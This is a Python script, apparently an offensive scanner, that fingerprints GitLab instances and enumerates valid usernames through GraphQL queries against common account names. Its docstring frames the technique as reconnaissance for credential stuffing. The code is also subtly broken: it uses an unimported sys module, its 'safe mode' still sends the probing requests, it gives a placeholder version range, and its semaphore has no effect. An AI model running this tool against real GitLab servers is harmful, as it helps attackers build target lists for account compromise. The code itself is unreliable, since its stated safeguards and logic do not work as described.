#!/usr/bin/env python3
"""
GitLab User Enumeration via GraphQL API
==========================================
This scanner identifies GitLab instances vulnerable to user enumeration through
responses from the GraphQL API. By issuing targeted queries for user information
and examining the differences in responses, the tool determines whether specific
usernames exist within the GitLab instance.

This vulnerability is commonly useful for attackers conducting reconnaissance on
targets, specifically for credential stuffing or other wider attack strategies.

Testing conditions:
  - GitLab Community and Enterprise prior to version X.Y.Z (if relevant)
  - Use with caution and ensure compliance with any applicable guidelines or program rules.

Key functionality:
  - Detects GitLab instances by inspecting HTTP responses for application headers and
    HTML content
  - Enumerates users by interacting with the GitLab GraphQL API
  - Offers safe detection mode which skips enumeration and verifies GitLab version

Usage:
  python gitlab_user_enum_scanner.py --target https://gitlab.example.com
  python gitlab_user_enum_scanner.py --target https://gitlab.example.com --safe
  python gitlab_user_enum_scanner.py --list targets.txt --output results.json
  
Requirements:
  - Python 3.10+
  - httpx library for asyncio-based HTTP requests

References:
  - https://gitlab.com/gitlab-org
  - https://www.synopsys.com/blogs/software-security/graphQL-security-vulnerabilities-explained/

Author: Your Name
"""

import asyncio
import argparse
import httpx
import json
import re
from typing import List, Dict, Optional
from datetime import datetime, timezone

# ANSI color definitions
RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
CYAN = "\033[96m"
RESET = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"

# Constants
TOOL_NAME = "gitlab_user_enum_scanner"
REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 30
GITLAB_USER_AGENT = "GitLab User Enumeration Scanner"

HEADERS = {
    "User-Agent": GITLAB_USER_AGENT,
    "Content-Type": "application/json",
}

# Version regex patterns
VERSION_PATTERNS = [
    r"GitLab(?: Enterprise Edition)? (\d+\.\d+\.\d+)",
    r"gitlab_version\s*=\s*['\"]([0-9]+\.[0-9]+\.[0-9]+)['\"]",
]

# Default user enumeration query pattern
GRAPHQL_QUERY = """
{
    user(username: "%s") {
        id
    }
}
"""

async def fetch(session: httpx.AsyncClient, url: str, follow_redirects=True) -> Optional[httpx.Response]:
    """Perform a GET request to the specified URL."""
    try:
        response = await session.get(url, timeout=REQUEST_TIMEOUT, follow_redirects=follow_redirects)
        return response
    except (httpx.RequestError, httpx.ConnectError, httpx.ReadTimeout):
        print(f"{c(RED, 'ERROR')} Connection failed to {url}")
        return None

async def detect_gitlab(session: httpx.AsyncClient, base_url: str) -> Optional[str]:
    """
    Attempt to detect a GitLab instance by inspecting HTTP responses
    and extracting the version if possible.
    """
    try:
        url = f"{base_url}/users/sign_in"
        response = await fetch(session, url)
        if response and response.status_code == 200:
            # Check for GitLab-specific headers or content
            if "gitlab" in response.text.lower() or "GitLab" in response.headers.get("server", ""):
                print(f"{c(GREEN, 'INFO')} GitLab detected at {base_url}")
                # Try to extract the version
                for pattern in VERSION_PATTERNS:
                    match = re.search(pattern, response.text)
                    if match:
                        version = match.group(1)
                        print(f"{c(CYAN, 'INFO')} GitLab version detected: {version}")
                        return version
                print(f"{c(YELLOW, 'INFO')} GitLab version could not be determined.")
                return None
    except Exception as e:
        print(f"{c(RED, 'ERROR')} Failed during GitLab detection: {str(e)}")
    return None

async def enumerate_users(session: httpx.AsyncClient, base_url: str, usernames: List[str], safe: bool) -> Dict[str, bool]:
    """Attempt to enumerate users via the GitLab GraphQL API."""
    results = {}
    url = f"{base_url}/api/graphql"
    for username in usernames:
        query = GRAPHQL_QUERY % username
        try:
            response = await session.post(url, json={"query": query}, timeout=REQUEST_TIMEOUT)
            if safe:
                print(f"{c(CYAN, 'SAFE MODE')} Detection only. Skipped enumeration for user: {username}")
                continue
            if response.status_code == 200 and '"id":' in response.text:
                results[username] = True
                print(f"{c(GREEN, 'VALID')} User '{username}' exists on {base_url}")
            else:
                results[username] = False
                print(f"{c(YELLOW, 'INVALID')} User '{username}' does not exist on {base_url}")
        except (httpx.RequestError, httpx.ConnectError, httpx.ReadTimeout):
            print(f"{c(RED, 'ERROR')} Failed to probe user: {username}")
    return results

async def main():
    parser = argparse.ArgumentParser(description="GitLab User Enumeration Scanner")
    parser.add_argument("--target", help="Target GitLab instance URL.")
    parser.add_argument("--list", help="File containing a list of target URLs.")
    parser.add_argument("--output", help="Output file for results in JSON format.")
    parser.add_argument("--safe", action="store_true", help="Safe mode: detection only, skips enumeration.")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Number of concurrent requests (default: 30).")
    parser.add_argument("--no-verify", action="store_true", help="Disable TLS certificate verification.")
    args = parser.parse_args()

    targets = []
    if args.target:
        targets.append(args.target)
    if args.list:
        with open(args.list, "r") as file:
            targets.extend(line.strip() for line in file if line.strip())

    if not targets:
        print(f"{c(RED, 'ERROR')} No targets specified. Use --target or --list.")
        sys.exit(1)

    if args.concurrency < 1:
        print(f"{c(RED, 'ERROR')} Concurrency value must be greater than 0.")
        sys.exit(1)

    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=not args.no_verify, headers=HEADERS) as client:
        results = {}
        for target in targets:
            async with semaphore:
                version = await detect_gitlab(client, target)
                if version or not args.safe:
                    usernames = ["root", "admin", "guest", "test", "user1", "developer"]
                    results[target] = await enumerate_users(client, target, usernames, args.safe)
        
        if args.output:
            with open(args.output, "w") as output_file:
                json.dump(results, output_file, indent=4)
                print(f"{c(CYAN, 'INFO')} Results saved to {args.output}")

if __name__ == "__main__":
    asyncio.run(main())
